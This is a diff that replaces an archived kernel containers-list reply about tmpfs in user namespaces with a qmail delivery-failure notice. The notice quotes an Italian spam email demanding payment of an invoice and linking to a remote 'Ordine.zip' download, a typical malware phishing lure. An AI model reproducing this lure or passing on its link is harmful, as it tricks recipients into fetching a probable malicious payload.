@@ -1,15 +1,11 @@
-From: Gao feng <gaofeng-BthXqXjhjHXQFUHtdCDX3A@public.gmane.org>
-Subject: Re: [PATCH] userns: enable tmpfs support for user namespace.
-Date: Wed, 24 Oct 2012 15:49:23 +0800
-Message-ID: <50879D83.2050905@cn.fujitsu.com>
-References: <1348042588-9031-1-git-send-email-gaofeng@cn.fujitsu.com>
-	<87wqzq8fe3.fsf@xmission.com> <505A65AB.4000703@cn.fujitsu.com>
-	<874nmt5x1r.fsf@xmission.com>
+From: MAILER-DAEMON-OMv46EKy6cVHnE6YE77o47htl1cEbuf5VpNB7YpNyf8@public.gmane.org
+Subject: failure notice
+Date: 24 Oct 2012 12:03:53 -0000
+Message-ID: <20121024140357.GA67730@mail08d.verio.de>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: base64
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-In-Reply-To: <874nmt5x1r.fsf-aS9lmoZGLiVWk0Htik3J/w@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -19,26 +15,65 @@ List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
 Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: "Eric W. Biederman" <ebiederm-aS9lmoZGLiVWk0Htik3J/w@public.gmane.org>
-Cc: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-5LqOIDIwMTLlubQwOeaciDIw5pelIDA4OjU5LCBFcmljIFcuIEJpZWRlcm1hbiDlhpnpgZM6Cj4g
-R2FvIGZlbmcgPGdhb2ZlbmdAY24uZnVqaXRzdS5jb20+IHdyaXRlczoKPiAKPj4g5LqOIDIwMTLl
-ubQwOeaciDE55pelIDE4OjQwLCBFcmljIFcuIEJpZWRlcm1hbiDlhpnpgZM6Cj4+PiBHYW8gZmVu
-ZyA8Z2FvZmVuZ0Bjbi5mdWppdHN1LmNvbT4gd3JpdGVzOgo+Pj4KPj4+PiBtb3VudGluZyB0bXBm
-cyBpbiB1c2VyIG5hbWVzcGFjZSBkb2VzIG5vIGhhcm0gdG8gdGhlIGhvc3QuCj4+Pj4gc28gZW5h
-YmxlIHRtcGZzIHN1cHBvcnQgZm9yIHRoZSB1c2VyIG5hbWVzcGFjZS4KPj4+Cj4+PiBJIHRoaW5r
-IHRoaXMgYWxsb3dzIGVzY2FwaW5nIGZyb20gbWVtb3J5IHJlc291cmNlIGxpbWl0cy4KPj4+Cj4+
-Cj4+IEdvdCBpdCxpdCBtYWtlcyBzZW5zZSxzb3JyeSBmb3IgdGhlIG5vaXNlLgo+IAo+IE5vIG5v
-aXNlIHByb2JsZW0uCj4gCj4gVGhpcyBpcyBhIHByb2JsZW0gdGhhdCB1bHRpbWF0ZWx5IG5lZWRz
-IHNvbHZpbmcuCj4gCj4gSSBwdXR0ZXIgYXQgdGhhdCBlbmQgb2YgbXkgdHJlZSBmcm9tIHRpbWUg
-dG8gdGltZSwgYmVjYXVzZSB0aG9zZSBhcmUgdGhlCj4gbW9yZSBpbnRlcmVzdGluZyBwcm9ibGVt
-cy4KPiAKCkhpIEVyaWMKCkkgdGVzdCB0aGUgdG1wZnMgd2l0aCBtZW0gY2dyb3VwLGFuZCBmb3Vu
-ZCB0aGUgbWVtb3J5IGNncm91cCBjYW4gbGltaXQKaG93IG1hbnkgbWVtb3J5IHRoZSB0YXNrcyB1
-c2VkIHRocm91Z2ggdG1wZnMuCgpTbyBJIHRoaW5rIHRoaXMgcHJvYmxlbSBoYXMgYWxyZWFkeSBi
-ZWVuIHNvbHZlZC4KCk9yIG1heWJlIEkgbWlzdW5kZXJzdGFuZCB3aGF0IHlvdSBzYWlkPwoKVGhh
-bmtzIGhlbHAgZnJvbSBHbGF1YmVyLgoKR2FvCl9fX19fX19fX19fX19fX19fX19fX19fX19fX19f
-X19fX19fX19fX19fX19fX19fCkNvbnRhaW5lcnMgbWFpbGluZyBsaXN0CkNvbnRhaW5lcnNAbGlz
-dHMubGludXgtZm91bmRhdGlvbi5vcmcKaHR0cHM6Ly9saXN0cy5saW51eGZvdW5kYXRpb24ub3Jn
-L21haWxtYW4vbGlzdGluZm8vY29udGFpbmVycw==
+Hi. This is the qmail-send program at lxw801.webhostingvirtual.com.
+I'm afraid I wasn't able to deliver your message to the following addresses.
+This is a permanent error; I've given up. Sorry it didn't work out.
+
+<1190986674.3959242803-8wPqirfX5GSonA0d6jMUrA@public.gmane.org>:
+128.241.52.1 does not like recipient.
+Remote host said: 571 Unable to determine MX host for '1190986674.3959242803-8wPqirfX5GSonA0d6jMUrA@public.gmane.org'
+Giving up on 128.241.52.1.
+
+<1190986673.3959013414-8wPqirfX5GSonA0d6jMUrA@public.gmane.org>:
+128.241.52.1 does not like recipient.
+Remote host said: 571 Unable to determine MX host for '1190986673.3959013414-8wPqirfX5GSonA0d6jMUrA@public.gmane.org'
+Giving up on 128.241.52.1.
+
+<1190986672.3958767645-8wPqirfX5GSonA0d6jMUrA@public.gmane.org>:
+128.241.52.1 does not like recipient.
+Remote host said: 571 Unable to determine MX host for '1190986672.3958767645-8wPqirfX5GSonA0d6jMUrA@public.gmane.org'
+Giving up on 128.241.52.1.
+
+<1190986669.3958456357-8wPqirfX5GSonA0d6jMUrA@public.gmane.org>:
+128.241.52.1 does not like recipient.
+Remote host said: 571 Unable to determine MX host for '1190986669.3958456357-8wPqirfX5GSonA0d6jMUrA@public.gmane.org'
+Giving up on 128.241.52.1.
+
+<1190986670.3958571055-8wPqirfX5GSonA0d6jMUrA@public.gmane.org>:
+128.241.52.1 does not like recipient.
+Remote host said: 571 Unable to determine MX host for '1190986670.3958571055-8wPqirfX5GSonA0d6jMUrA@public.gmane.org'
+Giving up on 128.241.52.1.
+
+--- Below this line is a copy of the message.
+
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: (qmail 13297 invoked from network); 24 Oct 2012 12:03:41 -0000
+Received: from unknown (HELO 441274-db1.indyarocks.com) (cosese-hrTmNdcHROEkDRencVCjvw@public.gmane.org)
+  by  with ESMTPA; 24 Oct 2012 12:03:41 -0000
+Received: from [192.168.100.17] ([192.168.100.17:37951])
+	by {#LAST_DNS} (envelope-from <update+Nim4ncWdyVSxxapWjLxj@{#LAST_DNS}>)
+	(ecelerity 2.2.2.45 r(34222M)) with ECSTREAM
+	id 0E/{DIGITS>2<2#MARK-{DIGITS>4<4#MARK-3030B0787; Tue, 02 Oct 2012 16:05:10 -0700
+Date: Tue, 2 Oct 2012 16:05:10 -0700
+To: <1190986669.3958456357-8wPqirfX5GSonA0d6jMUrA@public.gmane.org>
+From: "Robot" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Subject: Fwd: Non hai pagato per l'assicurazione al mese!
+Message-ID: <HDhnqgJIdGtSmcojLZ5MwAE0t4i@{#LAST_DNS}>
+MIME-Version: 1.0
+Content-Type: text/plain;
+ charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+
+
+
+   
+Ciao, 
+
+
+La fattura deve essere pagato prima della fine della settimana
+http://djrr.com.br/Ordine.zip
+
+Id 53931            
